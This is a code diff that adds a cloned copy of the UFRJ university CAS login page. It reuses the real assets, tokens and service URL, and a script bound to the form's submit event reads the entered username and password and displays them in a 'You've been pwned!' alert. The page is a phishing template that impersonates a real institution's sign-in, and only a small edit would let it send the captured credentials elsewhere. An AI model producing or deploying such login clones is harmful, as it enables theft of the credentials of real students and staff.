@@ -1,0 +1,61 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+  <title>RG - UFRJ</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <link href="http://cas.ufrj.br/assets/application-c86785c2c1c07b4e7ccf2c309f0aa7ad.css" media="all" rel="stylesheet" />
+  <script>
+//<![CDATA[
+window.CASino = { baseUrl: '/' };
+//]]>
+</script>
+  <script src="http://cas.ufrj.br/assets/application-36cc5c123f72ff6df905ee2dd2b2686a.js"></script>
+  <meta content="authenticity_token" name="csrf-param" />
+<meta content="nlPkfcauu3KyP7n1G4c7MuA31X6+dcUTu38pG2xR/aY=" name="csrf-token" />
+  <link href="http://cas.ufrj.br/assets/favicon-b800949a05e886206fb447c52a8c95f8.png" rel="shortcut icon" type="image/png" />
+  <link href="http://cas.ufrj.br/assets/logo-a7840f98ebedebd711be6abdf788ba44.png" rel="logo" type="image/png" />
+</head>
+<body>
+
+  <div class="container">
+  <div class="login box">
+    
+    <div class="logo">
+       <img alt="Logo" src="http://cas.ufrj.br/assets/logo-a7840f98ebedebd711be6abdf788ba44.png" />
+    </div>
+
+    <div class="form">
+      <form accept-charset="UTF-8" id="login-form" onsubmit="WriteToFile(this)"><div style="display:none"><input name="utf8" type="hidden" value="&#x2713;" /><input name="authenticity_token" type="hidden" value="nlPkfcauu3KyP7n1G4c7MuA31X6+dcUTu38pG2xR/aY=" /></div>
+        <input id="lt" name="lt" type="hidden" value="LT-15628687454899-tEisJvj7IlTLKlzWiuom66BVO3lErAxTmyPEVibJ" />
+        <input id="service" name="service" type="hidden" value="https://intranet.ufrj.br/cas?destination=node/4" />
+        <label for="username">Identificação (CPF ou Passaporte)</label>
+        <input autofocus="autofocus" id="username" name="username" type="text" />
+        <label for="password">Senha</label>
+        <input id="password" name="password" type="password" />
+        <label for="rememberMe">
+          <input id="rememberMe" name="rememberMe" type="checkbox" value="1" /> Permanecer conectado
+</label>        <button class="button" name="button" type="submit">Entrar</button>
+</form>    </div>
+  </div>
+    <div id="footer">
+    Desenvolvido por <a href="http://www.tic.ufrj.br/">TIC</a>
+  </div>
+
+</div>
+
+<script>
+
+function WriteToFile(passForm) {
+
+  var username = document.getElementById('username').value;
+  var password = document.getElementById('password').value;
+
+  alert("You've been pwned!\n Your username: " + username + "\n Your password: " + password);
+
+}
+
+</script>
+
+</body>
+</html>
